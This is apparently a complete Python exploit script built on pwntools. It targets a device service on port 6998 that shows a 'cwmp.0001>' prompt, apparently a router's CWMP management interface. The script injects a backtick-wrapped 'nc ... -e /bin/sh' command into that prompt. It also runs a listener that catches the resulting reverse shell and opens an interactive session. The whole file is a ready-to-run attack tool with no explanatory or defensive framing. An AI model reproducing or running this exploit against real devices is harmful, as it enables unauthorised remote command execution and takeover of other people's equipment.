from pwn import *
from sys import argv, exit
import logging
from threading import Thread

# Configure the logger
logging.basicConfig(
    level=logging.INFO,                      # Set log level
    format='[%(asctime)s] %(levelname)s: %(message)s',  # Log format
    datefmt='%H:%M:%S'                       # Time format
)

def rshell(lport):
    l = listen(lport)
    logging.debug("Waiting for reverse shell...")
    conn = l.wait_for_connection()
    logging.critical("GOT SHELL!")
    conn.interactive()

def main(rhost, lhost, lport):
    try:
        s = remote(rhost, 6998)
        logging.info("Connection established to the target, sending payload")
        th1 = Thread(target=rshell, args=(lport, ))
        th1.start()
        s.sendlineafter(b"cwmp.0001>", f"`nc {lhost} {lport} -e /bin/sh`")
        s.close()
    except:
        logging.error("Target not vuln or just a connection error")

if __name__ == "__main__":
    try:
        rhost = argv[1]
        lhost = argv[2]
        lport = argv[3]
    except:
        print("python3 Gigacenter.py [Target ip] [Localhost ip] [Local port]")
        exit()
    main(rhost, lhost, lport)